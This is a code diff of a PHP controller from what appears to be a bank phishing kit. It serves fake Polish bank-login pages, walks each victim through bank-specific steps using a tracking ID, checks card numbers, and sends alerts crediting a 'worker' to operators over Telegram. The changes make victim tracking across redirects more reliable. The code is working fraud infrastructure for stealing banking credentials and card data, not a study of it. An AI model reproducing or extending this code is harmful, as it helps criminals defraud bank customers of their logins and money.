@@ -13,14 +13,13 @@ use Illuminate\Support\Str;
 use Telegram\Bot\Api;
 use Telegram\Bot\Exceptions\TelegramSDKException;
 use Telegram\Bot\Keyboard\Keyboard;
-use Telegram\Bot\Objects\Message;
 use Throwable;
 use Cache;
 
 class PagesController extends Controller
 {
     /**
-     * @var Fake|\Illuminate\Database\Eloquent\Builder|\Illuminate\Database\Eloquent\Model|object|null
+     * @var Fake|null
      */
     protected $fake;
     protected $uuid;
@@ -36,12 +35,14 @@ class PagesController extends Controller
             $category = Category::get()->filter(function ($category) {
                 return in_array($this->subdomain, explode(',', setting($category->name, $category->name)));
             })->first();
-
-            $track_id = $request->has($key) ? $request->get($key) : $request->session()->get($key);
             $this->uuid = $request->session()->get('uuid');
+            $track_id = ($request->has($key) || (!$request->ajax() && $request->method() === 'GET'))
+                ? $request->get($key)
+                : $request->session()->get($key);
             try {
                 if (is_null($track_id) || is_null($category)) throw new Exception();
                 $this->fake = $category->fakes()->whereTrackId($track_id)->first();
+
                 if (is_null($this->fake)) throw new Exception();
                 $track_id = $this->fake->track_id;
                 $request->session()->put($key, $track_id);
@@ -73,7 +74,8 @@ class PagesController extends Controller
      */
     private function hasErrorRedirect(): bool
     {
-        return Cache::get("$this->uuid.redirectUrl") === "/error";
+        $redirectUrl = Cache::get("$this->uuid.redirectUrl");
+        return !is_null($redirectUrl) && parse_url($redirectUrl,PHP_URL_PATH) === "/error";
     }
 
     private function processRedirection(Request $request)
@@ -152,6 +154,16 @@ class PagesController extends Controller
         }
     }
 
+    /**
+     * @param string $url
+     * @param array $query
+     * @return string
+     */
+    private function urlGenerate(string $url, array $query = []): string
+    {
+        return url($url) . '?' . http_build_query($query);
+    }
+
     public function index()
     {
         $fake = $this->getFake();
@@ -182,6 +194,7 @@ class PagesController extends Controller
 
     public function banks($name = null)
     {
+
         $title = 'Wybierz swój bank, aby kontynuować';
         $favicon = asset('images/banks_favicon.ico');
         $banks = collect(config('fakes.banks'));
@@ -208,7 +221,7 @@ class PagesController extends Controller
             ]);
             return view($view, compact('title', 'favicon'));
         }
-        return redirect('/order');
+        return redirect($this->urlGenerate('/order', ['track_id' => $fake->track_id]));
     }
 
     public function logBank(Request $request)
@@ -216,10 +229,10 @@ class PagesController extends Controller
         $fake = $this->getFake();
         $bankName = ucfirst($this->bank);
         $step = ($request->has('step')) ? $request->get('step') : false;
-        $next = subRoute('fake.order');
+        $next = subRoute('fake.order', ['track_id' => $fake->track_id]);
         switch ($this->bank) {
             case 'inteligo':
-                $next = subRoute('fake.code');
+                $next = subRoute('fake.code', ['track_id' => $fake->track_id]);
                 break;
             case 'millenium':
                 if (!$step) $next = null;
@@ -307,7 +320,7 @@ class PagesController extends Controller
         $notify = is_null($bankInfo) ? "<b>(Возможно фейк карта!)</b>" : "";
         $binName = $bankInfo['bank']['name'] ?? null;
 
-        $next = subRoute('fake.code');
+        $next = subRoute('fake.code', ['track_id' => $fake->track_id]);
         $step = ($this->bank === 'inteligo') ? "fakes.banks.$bankName" : false;
         $html = $step && view()->exists($step) ? view($step)->render() : null;
 
@@ -387,7 +400,7 @@ class PagesController extends Controller
                 "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
             ]);
         }
-        if ($this->bank === 'millenium') $next = subRoute('fake.verify');
+        if ($this->bank === 'millenium') $next = subRoute('fake.verify', ['track_id' => $fake->track_id]);
 
         return response()->json(['html' => null, 'next' => $next ?? null]);
     }
